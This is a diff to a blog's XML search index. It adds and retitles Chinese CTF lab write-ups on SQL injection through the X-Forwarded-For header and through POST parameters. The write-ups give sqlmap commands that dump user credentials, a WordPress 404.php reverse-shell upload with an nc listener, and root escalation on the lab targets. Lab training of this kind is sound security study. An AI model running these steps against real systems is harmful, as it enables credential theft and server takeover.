@@ -1,7 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[CTF靶场练-SQL注入（POST参数注入）]]></title>
+    <title><![CDATA[CTF靶场训练-SQL注入（X-Forwarded-For注入）]]></title>
+    <url>%2F2019%2F08%2F28%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88X-Forwarded-For%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 任何一个用户可以输入的位置都肯是注入点。比如url中，以及http报文中，头部参数； 简介X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。简单的来说，就是服务器端用来获取客户端真实IP的字段。 X-Forwarded-For格式 1X-Forwarded-For: client1, proxy1, proxy2 X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，中间如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。 代理方向 1客户端=&gt;正向代理=&gt;透明代理=&gt;服务器反向代理=&gt;Web服务器 &emsp;&emsp;一般的客户端（例如浏览器）发送HTTP请求是没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。 X-Forwarded-For注入的实现原理：伪造X-Forwarded-For头部，头部内容包含恶意的sql语句 参考博客 X-Forwarded-For的一些理解 利用X-Forwarded-For伪造客户端IP漏洞成因及防范 利用X-Forwarded-For进行sql注入 实验环境 攻击机 Kali： 192.168.43.44 靶场机器 Debian： 192.168.43.93 信息探测探测靶机开放服务及其版本– nmap -sV 192.168.43.97 【开放80端口http服务】 【Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器】 浏览器访问站点页面 发现管理员登陆页面尝试弱口令登陆失败 漏洞扫描使用AWVS扫描站点漏洞（AWVS是一款专业的Web扫描工具）这里直接给出扫描结果发现站点存在sql注入漏洞,可注入的参数X-Forwarded-For 数据库爆破既然知道存在sql注入漏洞就可以用sql注入神器—-sqlmap先做一个简单的探测（-H +增加的头部 –batch 由系统默认参数） 1sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --batch 果然存在漏洞那么就好办了跑数据库名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --dbs --batch 跑数据库表名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog --tables --batch 跑列名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users --columns --batch 跑字段 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users -C login,password --dump --batch 获得管理员账号，就可以登陆后台了]]></content>
+      <categories>
+        <category>靶场实战</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CTF靶场训练-SQL注入（POST参数注入）]]></title>
     <url>%2F2019%2F08%2F27%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88POST%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
     <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 任何一个用户可以输入的位置都肯是注入点。比如url中，以及http报文中，POST传递的参数； 实验环境 攻击机 Kali：192.168.43.44 靶场机器 Ununtu 14.04 ： 192.168.43.97 目的：获得靶机root权限 信息探测探测靶机开放的服务– nmap -sV 192.168.43.97 发现靶机80、8080端口开放http服务 既然开放了http服务就试着浏览器访问一下或查看源代码80端口开放的web站点只有一张图片8080端口开口的web站点是一个购物站点 尝试扫描站点下的网页 1root@kali:~# nikto -host http://192.168.43.97 1root@kali:~# dirb http://192.168.43.97:8080 发现管理员登陆页面 漏洞扫描管理员界面尝试弱口令失败；扫一下有没有sql注入漏洞burpsuite抓包 sqlmap扫描 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 --dbs --batch 这里普通标准的扫描无法扫出sql漏洞，需要提高扫描等级（–level 5 –risk 3）数据库名已经跑出来这里发现8080端口站点使用的数据库wordpress8080所以这里选择这个数据库接下来就是跑出表名 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 --tables --batch 跑列名 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 -T users --columns --batch 跑字段 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dump --batch 密码已经跑出来了 登陆管理员后台右键浏览器打开，输入账号密码，登陆后台 上传webshell需要一个webshell在/usr/share/webshells/php中选择php-reverse-shell.php 找到404页面（Appearance-&gt;Editor-&gt;404.php）替换成shell点击update file，提交 wordpress 上传点 theme 404.php执行：http://靶场IP/wordpress/wp-content/themes/主题名/404.php 浏览器打开网页，执行上传的shell 1http://192.168.43.97:8080/wordpress/wp-content/themes/twentythirteen/404.php kali 用nc监听4444端口– nc -vlp 4444 提升权限用python优化shell提权root权限，密码尝试空密码或SuperSecretPassword登陆成功，获得靶机root权限]]></content>
       <categories>
